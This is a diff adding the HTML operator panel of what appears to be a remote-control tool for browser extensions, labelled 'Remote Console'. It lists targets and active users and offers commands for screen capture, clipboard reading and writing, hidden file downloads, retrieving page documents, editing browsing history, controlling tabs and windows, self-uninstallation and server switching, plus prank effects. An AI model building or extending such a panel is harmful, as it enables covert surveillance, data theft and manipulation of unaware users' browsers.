@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="index.css" rel="stylesheet" type="text/css" />
+    <title>Remote Console</title>
+</head>
+<body>
+
+    <div id="imageViewer">
+        <img src="" id="captureDisplay"/>
+    </div>
+
+    <div class="main">
+        <div class="top">
+            <div>
+                <span>YOU: {{IP}}</span>
+            </div>
+            <div class="commandsTop">
+                <div>
+                    <input type="text" placeholder="Enter targets" id="targetInput" />
+                    <input type="text" placeholder="Enter response targets" id="responseTargetInput" />
+                </div>
+                <div>
+                    <textarea placeholder="Enter command" id="commandInput"></textarea>
+                    <textarea placeholder="Enter value" id="valueInput"></textarea>
+                </div>
+                <div class="btns">
+                    <button id="clearInputs">Clear</button>
+                    <button id="sendCommandBtn">Send</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="bottom">
+            <div class="consoleParent">
+                <span>CONSOLE</span>
+                <textarea id="consoleTxt" readonly class="console"></textarea>
+            </div>
+            <div class="activeUsersParent">
+                <span>ACTIVE USERS</span>
+                <textarea id="activeUsers" readonly class="console"></textarea>
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+
+
+
+    <div class="cmd_palette_top">
+        <div class="search_top">
+            <input type="text" placeholder="Search command..." id="cmd_search">
+            <button id="clear_search">X</button>
+        </div>
+        <div class="cmd_list">
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="getinfo">Get Info</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="capture">Capture</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="explorer">Explorer</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="barrelroll" v='{params:{duration:1000, count:1}}'>Barrel Roll</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="barrelroll" v='{selector:"", delay:0, params:{duration:1000, count:1, direction:"normal"}}'>*</span>
+                        )
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="jumpscare" v='{params:{duration:1000, filename:"icon.png"}}'>Jumpscare</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="jumpscare" v='{selector:"", delay:0, params:{duration:1000, filename:"icon.png"}}'>*</span>
+                        )
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="melt" v='{params:{duration:1000}}'>Melt</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="melt" v='{selector:"", delay:0, params:{duration:1000}}'>*</span>
+                        )
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="mess" v='{selector:"body *", radius:50}'>Mess</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="follow" v='{selector:"", offset:270}'>Follow Cursor</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="forcefeed" v='{selector:"", text:""}'>Force Feed</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="forcefeed" v='{selector:"", text:"", deleteMode:1}'>*</span>
+                        )
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="google" v="burger">Google</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="historyadd" v="http://">Add url to History</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="clipboard set" v=''>Clipboard</span>
+                    <div class="valueTemplates"></div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="download set" v='burger'>Set</span>
+                    <span class="sub_cmd" c="download get" v=''>Get</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="download" v='{url:"", filename:"", saveAs:false, conflictAction:"uniquify"}'>Download</span>
+                    <div class="valueTemplates"></div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="download hidden" v='{url:"", filename:"", saveAs:false, conflictAction:"uniquify"}'>Hidden</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="notif">Notification</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="notif create" v='{title:"",message:"",contextMessage:"",type:"basic",iconUrl:"./img/void.png"}'>*</span>
+                        )
+                    </div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="notif create" v='{title:"",message:"",type:"basic",iconUrl:"./img/void.png"}'>Create</span>
+                    <span class="sub_cmd" c="notif all" v="">Get All</span>
+                    <span class="sub_cmd" c="notif clear" v="">Clear all</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="tabs">Tabs</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="tabs update" v='{url:"", active:true, muted:false, pinned:false, highlighted:true}'>U</span>
+                        <span c="tabs create" v='{url:"", active:true, index:0, pinned:false, windowId:0, highlighted:true, audible:true, index:0}'>Q</span>
+                        <span c="tabs create" v='{url:"", active:true, index:0, pinned:false, windowId:0, highlighted:true}'>C</span>
+                        <span c="tabs move" v='{index:0, windowId:0}'>M</span>
+                        )
+                    </div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="tab active" v="">Active</span>
+                    <span class="sub_cmd" c="tab all" v="">Get All</span>
+                    <span class="sub_cmd" c="tab query" v="{}">Query</span>
+                    <span class="sub_cmd" c="tab create" v='{url:"", active:true}'>Create</span>
+                    <span class="sub_cmd" c="tab update ID" v='{url:"", active:true, muted:false, pinned:false, highlighted:true}'>Update</span>
+                    <span class="sub_cmd" c="tab move" v="{index:0}">Move</span>
+                    <span class="sub_cmd" c="tab high" v="ID">Highlight</span>
+                    <span class="sub_cmd" c="tab zoom ID" v="1">Zoom</span>
+                    <span class="sub_cmd" c="tab reload" v="ID">Reload</span>
+                    <span class="sub_cmd" c="tab remove" v="ID">Remove</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="windows">Windows</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="window update" v='{url:"", drawAttention:true, focused:true, state:"normal", height:800, width:800, left:0, top:0}'>U</span>
+                        <span c="window update" v='{url:"", drawAttention:true, focused:true, state:"maximized", type:"normal"}'>U</span>
+                        <span c="window create" v='{url:"", type:"popup", focused:true, height:800, width:800, left:0, top:0, tabId:1}'>C</span>
+                        <span c="window create" v='{url:"", focused:true, state:"maximized", tabId:1, type:"normal"}'>C</span>
+                        )
+                    </div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="window current" v="">Get Current</span>
+                    <span class="sub_cmd" c="window all" v="">Get All</span>
+                    <span class="sub_cmd" c="window query" v="{}">Query</span>
+                    <span class="sub_cmd" c="window create" v='{url:"", focused:true}'>Create</span>
+                    <span class="sub_cmd" c="window update ID" v='{url:"", drawAttention:true, focused:true, state:"maximized", type:"normal"}'>Update</span>
+                    <span class="sub_cmd" c="window remove" v="ID">Remove</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="html">Html</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="html create" v='{tag:"", html:"", selector:"", prepend:false}'>*</span>
+                        )
+                    </div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="html get">Get Document</span>
+                    <span class="sub_cmd" c="html create" v='{tag:"", html:"", selector:""}'>Create</span>
+                    <span class="sub_cmd" c="html modify" v='{selector:"", attr:[{textContent:"some text"}]}'>Modify</span>
+                    <span class="sub_cmd" c="html action" v='{selector:"", call:"click"}'>Action</span>
+                    <span class="sub_cmd" c="html remove" v='SELECTOR'>Remove</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="style">Style</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="style create" v='{selector:"", css:"", activation:"", id:""}'>*</span>
+                        )
+                    </div>
+                </div>
+                <div class="sub_cmd_list">
+                    <span class="sub_cmd" c="style create" v='{selector:"",css:"",id:""}'>Create</span>
+                    <span class="sub_cmd" c="style remove" v='ID'>Remove</span>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="removedownload" v=>Remove Download</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="keepawake" v="display">Keep Awake</span>
+                    <div class="valueTemplates">
+                        (
+                        <span c="keepawake" v="display">D</span>
+                        <span c="keepawake" v="system">S</span>
+                        )
+                    </div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="stopkeepawake">Stop Keep Awake</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="uninstallself">Uninstall Self</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+            <div class="cmd">
+                <div class="cmd_header">
+                    <span class="cmd_name" c="changeip" v="192.168.0.1:3000">Change Server Ip</span>
+                    <div class="valueTemplates"></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+
+
+    <script src="index.js"></script>
+</body>
+</html>
